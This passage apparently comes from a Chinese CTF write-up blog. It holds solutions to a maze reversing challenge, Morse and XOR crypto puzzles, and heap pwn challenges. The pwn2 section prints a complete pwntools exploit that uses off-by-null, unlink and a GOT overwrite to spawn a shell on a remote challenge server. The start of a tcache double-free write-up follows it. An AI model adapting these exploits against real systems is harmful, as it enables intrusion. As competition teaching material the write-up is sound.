<span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">0</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span><br> <span class="hljs-attribute">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">1</span>  <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><code>511=64*7+63</code>所以程序要求从第0层的开头走到第7层的结尾</p><p>分别通过<code>a-下，b-上，l-左，r-右，u-下一层，d-上一层</code>进行移动</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png5.png" srcset="/img/loading.gif" lazyload alt=""></p><p>input: <code>arruuuraaaaarrdbbuuuuuaadrrau</code></p><p>flag：<code>flag&#123;6c2a5b75-232d-26ea-c3cc-8f7a924d7357&#125;</code></p><h2 id="pwn">pwn</h2><h3 id="pwn2">pwn2</h3><p>利用创建<code>chunk</code>时的<code>off by null</code>漏洞，通过<code>chunk3</code>设置<code>chunk4</code>的<code>inuse</code>位为<code>0</code>，这样在释放<code>chunk4</code>时就会触发<code>unlink</code></p><p>利用<code>unlink</code>，在<code>chunk_list</code>中写入<code>chunk_list</code>的地址，这样可以达到任意地址读写,需要在合并之前将<code>chunk3</code>的<code>fd-&gt;bk</code>与<code>bk-&gt;fd</code>指向<code>chunk3</code>,<code>chunk3-&gt;fd</code>与<code>chunk3-&gt;bk</code>，就为<code>chunk_list</code>上的地址</p><p>然后因为程序中<code>strlen</code>和<code>free</code>都是以<code>chunk</code>为第一个参数，所以可以通过修改<code>got表</code>内<code>free</code>的内容为<code>plt表</code>中的<code>puts</code>，来获取<code>chunk3</code>的<code>fd</code>字段，计算得到<code>libc</code>地址，通过修改<code>got表</code>中的<code>strlen内容</code>为<code>system</code>地址 执行<code>system(&quot;/bin/sh&quot;)</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">ind,size,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;(1 ~ 1024):&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;(0~9):&#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendafter(<span class="hljs-string">&#x27;Content:&#x27;</span>,data)<br><br>p=remote(<span class="hljs-string">&#x27;101.200.76.17&#x27;</span>,<span class="hljs-string">&#x27;24195&#x27;</span>)<br><span class="hljs-comment">#p=process(&#x27;./b64heap&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>e=ELF(<span class="hljs-string">&#x27;./b64heap&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>free_got=e.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>strlen_got=e.got[<span class="hljs-string">&#x27;strlen&#x27;</span>]<br>puts_plt=e.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>chunk_list=<span class="hljs-number">0x6020c0</span><br>heap_list=chunk_list<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0xf0</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&quot; &quot;</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>free(<span class="hljs-number">3</span>)<br>fd=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x18</span><br>bk=heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">3</span>-<span class="hljs-number">0x10</span><br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x98</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>)+p64(fd)+p64(bk)+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x70</span>+p64(<span class="hljs-number">0x90</span>))<br>free(<span class="hljs-number">4</span>)<br><span class="hljs-comment">#free(3)</span><br>edit(<span class="hljs-number">3</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>show(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,p64(heap_list+<span class="hljs-number">0x8</span>*<span class="hljs-number">5</span>))<br>edit(<span class="hljs-number">0</span>,p64(heap_list+<span class="hljs-number">0x8</span>))<br>edit(<span class="hljs-number">3</span>,p64(free_got))<br>edit(<span class="hljs-number">5</span>,p8(<span class="hljs-number">0x80</span>))<br>edit(<span class="hljs-number">0</span>,p64(puts_plt))<br>free(<span class="hljs-number">1</span>)<br>d=u64(p.read(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br>malloc_hook=d-<span class="hljs-number">0x58</span>-<span class="hljs-number">0x10</span><br><br>system=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(strlen_got))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(system))<br>edit(<span class="hljs-number">3</span>,p64(strlen_got))<br>edit(<span class="hljs-number">0</span>,p64(system))<br><br>edit(<span class="hljs-number">6</span>,<span class="hljs-string">&#x27;cat flag\n&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png6.png" srcset="/img/loading.gif" lazyload alt=""></p><h2 id="crypto">crypto</h2><h3 id="crypto1">crypto1</h3><p>只有A，B和空格，明显是摩斯<br>将<code>A</code>替换成<code>-</code>，<code>B</code>替换成<code>.</code>，<code>空格</code>替换<code>/</code></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">morse</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.codedict=&#123;<span class="hljs-string">&#x27;.-&#x27;</span>:<span class="hljs-string">&quot;a&quot;</span>,<br>                    <span class="hljs-string">&#x27;-...&#x27;</span>:<span class="hljs-string">&quot;b&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-.&#x27;</span>:<span class="hljs-string">&quot;c&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..&#x27;</span>:<span class="hljs-string">&quot;d&quot;</span>,<br>                    <span class="hljs-string">&#x27;.&#x27;</span>:<span class="hljs-string">&quot;e&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-.&#x27;</span>:<span class="hljs-string">&quot;f&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.&#x27;</span>:<span class="hljs-string">&quot;g&quot;</span>,<br>                    <span class="hljs-string">&#x27;....&#x27;</span>:<span class="hljs-string">&quot;h&quot;</span>,<br>                    <span class="hljs-string">&#x27;..&#x27;</span>:<span class="hljs-string">&quot;i&quot;</span>,<br>                    <span class="hljs-string">&#x27;.---&#x27;</span>:<span class="hljs-string">&quot;j&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.-&#x27;</span>:<span class="hljs-string">&quot;k&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-..&#x27;</span>:<span class="hljs-string">&quot;l&quot;</span>,<br>                    <span class="hljs-string">&#x27;--&#x27;</span>:<span class="hljs-string">&quot;m&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.&#x27;</span>:<span class="hljs-string">&quot;n&quot;</span>,<br>                    <span class="hljs-string">&#x27;---&#x27;</span>:<span class="hljs-string">&quot;o&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--.&#x27;</span>:<span class="hljs-string">&quot;p&quot;</span>,<br>                    <span class="hljs-string">&#x27;--.-&#x27;</span>:<span class="hljs-string">&quot;q&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.&#x27;</span>:<span class="hljs-string">&quot;r&quot;</span>,<br>                    <span class="hljs-string">&#x27;...&#x27;</span>:<span class="hljs-string">&quot;s&quot;</span>,<br>                    <span class="hljs-string">&#x27;-&#x27;</span>:<span class="hljs-string">&quot;t&quot;</span>,<br>                    <span class="hljs-string">&#x27;..-&#x27;</span>:<span class="hljs-string">&quot;u&quot;</span>,<br>                    <span class="hljs-string">&#x27;...-&#x27;</span>:<span class="hljs-string">&quot;v&quot;</span>,<br>                    <span class="hljs-string">&#x27;.--&#x27;</span>:<span class="hljs-string">&quot;w&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-&#x27;</span>:<span class="hljs-string">&quot;x&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--&#x27;</span>:<span class="hljs-string">&quot;y&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..&#x27;</span>:<span class="hljs-string">&quot;z&quot;</span>,<br>                    <span class="hljs-string">&#x27;.----&#x27;</span>:<span class="hljs-string">&quot;1&quot;</span>,<br>                    <span class="hljs-string">&#x27;..---&#x27;</span>:<span class="hljs-string">&quot;2&quot;</span>,<br>                    <span class="hljs-string">&#x27;...--&#x27;</span>:<span class="hljs-string">&quot;3&quot;</span>,<br>                    <span class="hljs-string">&#x27;....-&#x27;</span>:<span class="hljs-string">&quot;4&quot;</span>,<br>                    <span class="hljs-string">&#x27;.....&#x27;</span>:<span class="hljs-string">&quot;5&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....&#x27;</span>:<span class="hljs-string">&quot;6&quot;</span>,<br>                    <span class="hljs-string">&#x27;--...&#x27;</span>:<span class="hljs-string">&quot;7&quot;</span>,<br>                    <span class="hljs-string">&#x27;---..&#x27;</span>:<span class="hljs-string">&quot;8&quot;</span>,<br>                    <span class="hljs-string">&#x27;----.&#x27;</span>:<span class="hljs-string">&quot;9&quot;</span>,<br>                    <span class="hljs-string">&#x27;-----&#x27;</span>:<span class="hljs-string">&quot;0&quot;</span>,<br>                    <span class="hljs-string">&#x27;..--..&#x27;</span>:<span class="hljs-string">&quot;?&quot;</span>,<br>                    <span class="hljs-string">&#x27;-..-.&#x27;</span>:<span class="hljs-string">&quot;/&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.&#x27;</span>:<span class="hljs-string">&quot;(&quot;</span>,<br>                    <span class="hljs-string">&#x27;-.--.-&#x27;</span>:<span class="hljs-string">&quot;)&quot;</span>,<br>                    <span class="hljs-string">&#x27;-....-&#x27;</span>:<span class="hljs-string">&quot;-&quot;</span>,<br>                    <span class="hljs-string">&#x27;.-.-.-&#x27;</span>:<span class="hljs-string">&quot;.&quot;</span>,<br>                    <span class="hljs-string">&#x27;--..--&#x27;</span>:<span class="hljs-string">&#x27;,&#x27;</span>,<br>                    <span class="hljs-string">&#x27;-.-.-.&#x27;</span>:<span class="hljs-string">&#x27;;&#x27;</span>,<br>                    <span class="hljs-string">&#x27;.----.&#x27;</span>:<span class="hljs-string">&#x27;\&#x27;&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GetPlain</span>(<span class="hljs-params">self,text</span>):<br>        textlist=text.split(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        detext=<span class="hljs-string">&#x27;&#x27;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> textlist:<br>            detext+=self.codedict[i]<br>        <span class="hljs-keyword">return</span> detext;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">DeBlast</span>(<span class="hljs-params">self,text,detext</span>):<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.codedict.keys():<br>            <span class="hljs-keyword">if</span> text.find(i)==<span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-built_in">len</span>(text)-<span class="hljs-built_in">len</span>(i))==<span class="hljs-number">0</span>:<br>                    self.delist.append(detext+self.codedict[i])<br>                    <span class="hljs-keyword">continue</span><br>                self.DeBlast(text[<span class="hljs-built_in">len</span>(i):],detext+self.codedict[i])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">decode</span>(<span class="hljs-params">self,text,seg=<span class="hljs-string">&#x27;/&#x27;</span>,point=<span class="hljs-string">&#x27;.&#x27;</span>,hor=<span class="hljs-string">&#x27;-&#x27;</span>,blast=<span class="hljs-number">0</span>,out=<span class="hljs-number">1</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">            key[0]==&#x27;.&#x27;</span><br><span class="hljs-string">            key[1]==&#x27;-&#x27;</span><br><span class="hljs-string">            key[2]==&#x27;/&#x27;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        key=[point,hor,seg]<br>        div=[<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;/&#x27;</span>]<br>        <span class="hljs-keyword">if</span> blast==<span class="hljs-number">0</span>:<br>            self.detext=self.GetPlain(text)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-built_in">print</span>(self.detext)<br>            <span class="hljs-keyword">return</span> self.detext<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                text=text.replace(key[i],div[i])<br>            self.delist=[]<br>            self.DeBlast(text,<span class="hljs-string">&#x27;&#x27;</span>)<br>            <span class="hljs-keyword">if</span> out:<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> self.delist:<br>                        <span class="hljs-built_in">print</span>(i)<br>            <span class="hljs-keyword">return</span> self.delist<br>m=morse()<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;classicCrypto.txt&#x27;</span>)<br>d=f.read().splitlines()<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    e=e+m.decode(i)+<span class="hljs-string">&#x27; &#x27;</span><br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png7.png" srcset="/img/loading.gif" lazyload alt=""></p><p>在<a href="https://quipqiup.com/%E7%88%86%E7%A0%B4">https://quipqiup.com/爆破</a></p><p><code>cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior, which is divided into classical cryptography and modern cryptography. the main classical cipher types are transposition ciphers, which rearrange the order of letters in a message. an early substitution cipher was the caesar cipher, in which each letter in the plaintext was replaced by a letter some fixed number of positions further down the alphabet. since the development of rotor cipher machines in world war i and the advent of computers in world war ii, cryptography methods have become increasingly complex and its applications more varied. modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions. the growth of cryptographic technology has raised a number of legal issues in the information age. cryptography's potential for use as a tool for espionage and sedition has led many governments to classify it as a weapon and to limit or even prohibit its use and export. in some jurisdictions where the use of cryptography is legal, laws permit investigators to compel the disclosure of encryption keys for documents relevant to an investigation. cryptography also plays a major role in digital rights management and copyright infringement disputes in regard to digital media.the flag is 1d817f23-4e20-9405-bf6d-e83d055316d6, please add flag string and braces yourself, and all letters are lowercase.</code></p><p>得到flag：<code>1d817f23-4e20-9405-bf6d-e83d055316d6</code></p><h3 id="crypto2">crypto2</h3><p>将题目给出的字符串进行栅栏后发现与flag形式接近</p><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png8.png" srcset="/img/loading.gif" lazyload alt=""></p><p>根据flag的格式发现整个字符串需要异或32，根据题目描述的uuid格式，发现flag中小写的<code>l</code>为<code>-</code>，所以原先小写的字符在异或32的基础上还要减去31</p><p>解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&quot;FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv&quot;</span><br>b=<span class="hljs-string">&quot;FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]&quot;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> b:<br>    <span class="hljs-keyword">if</span> i.islower():<br>        e=e+<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)-<span class="hljs-number">31</span>)<br>    <span class="hljs-keyword">else</span>:<br>        e=e+<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">32</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p><img src="/img/blog_img/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E6%9D%AF%E9%A2%84%E8%B5%9B/page_Image/png9.png" srcset="/img/loading.gif" lazyload alt=""></p>]]></content>
    
    
    <categories>
      
      <category>wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022巅峰极客-pwn</title>
    <link href="/page/wp/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn/"/>
    <url>/page/wp/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="Gift">Gift</h2><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift.jpg" srcset="/img/loading.gif" lazyload alt="choice_gift" title="choice_gift"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift-1.jpg" srcset="/img/loading.gif" lazyload alt="remove_gift" title="remove_gift"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift-2.jpg" srcset="/img/loading.gif" lazyload alt="check_gift" title="check_gift"></p><p><img src="/img/blog_img/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-pwn-Gift-3.jpg" srcset="/img/loading.gif" lazyload alt="bargain" title="bargain"></p><p>程序中仅允许创建<code>10</code>个<code>chunk</code>，但在<code>remove_gift</code>函数中存在<code>uaf</code>，<code>bargain</code>函数可以用来修改<code>chunk</code>的<code>fd</code>，且可以输入负数让<code>fd</code>向大地址偏移，但只能修改低四字节，经过测试，靶机中<code>libc</code>版本为<code>libc_2.27</code>~<code>libc_2.31</code>，所以可以利用<code>tcache bin attack</code>，在<code>free_hook</code>的位置写入<code>one_gadget</code>函数，来获取<code>shell</code>，使用正常的方法先释放<code>7</code>个<code>chunk</code>填满<code>tcache bin</code>，再释放一个<code>chunk</code>，使其进入<code>unsorted bin</code>来获取<code>libc</code>地址，这时已经创建了<code>8</code>个<code>chunk</code>，<code>bargain</code>函数又不能修改整个<code>fd</code>字段，所以这种方法不行，不过可以利用<code>bargain</code>修改<code>tcache bin</code>的结构，让原本释放过的<code>chunk</code>，再次释放，这样可以省下一开始创建<code>chunk</code>的数量，又可以构造<code>double free</code>达到<code>tcache bin attack</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">mode,data=<span class="hljs-string">&#x27; &#x27;</span></span>):<br>    p.sendlineafter(<span 